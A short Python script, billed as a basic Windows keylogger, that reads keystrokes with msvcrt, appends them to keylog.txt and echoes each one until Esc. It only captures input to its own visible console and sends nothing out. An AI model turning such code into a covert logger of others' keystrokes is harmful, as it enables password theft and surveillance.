# Basic Keylogger in Python without external libraries (Windows only)
import msvcrt
import time

def keylogger():
    print("Keylogger started. Press 'Esc' to exit.\n")
    log_file = "keylog.txt"
    
    with open(log_file, "a") as f:
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                # Convert bytes to string
                key_str = key.decode('utf-8', errors='ignore')
                
                # Exit on pressing 'Esc' key (ASCII 27)
                if ord(key) == 27:
                    print("Keylogger stopped.")
                    break
                
                # Write to log file
                f.write(key_str)
                f.flush()
                print(f"Key pressed: {key_str}")
            time.sleep(0.01)  # Small delay to prevent high CPU usage

if __name__ == "__main__":
    keylogger()
